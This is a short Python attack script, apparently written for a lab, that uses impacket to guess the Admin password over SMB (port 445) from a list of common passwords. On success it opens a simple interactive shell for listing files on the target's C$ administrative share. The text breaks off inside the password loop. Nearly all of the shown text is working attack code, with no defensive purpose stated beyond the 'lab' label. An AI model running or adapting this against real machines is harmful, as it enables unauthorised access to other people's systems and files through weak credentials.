import sys
from impacket.smbconnection import SMBConnection

# --- Lab Configuration ---
TARGET_IP = "192.168.1.xx" # The Toshiba IP
USERNAME = "Admin"
PASSWORDS = ["123456", "admin123", "qwerty"] #

def interactive_shell(conn):
    print(f"\n[!] ACCESS GRANTED. Entering Interactive Mode...")
    print("Type 'ls' to see files, 'cd <folder>' to move, or 'exit' to quit.")
    
    current_path = "C$/*" # Start at the root of C: drive
    
    while True:
        cmd = input(f"smb_shell ({current_path}) > ").strip()
        
        if cmd.lower() == 'exit':
            break
        elif cmd.lower() == 'ls':
            try:
                files = conn.listPath("C$", current_path)
                for f in files:
                    print(f"  {f.get_longname()}")
            except Exception as e:
                print(f"[-] Error listing files: {e}")
        else:
            print("[*] Command received. In a real lab, you'd use 'get' or 'put' here.")

def start_attack():
    print(f"[*] Attacking {TARGET_IP}...")
    for pwd in PASSWORDS:
        try:
            conn = SMBConnection(TARGET_IP, TARGET_IP, sess_port=445)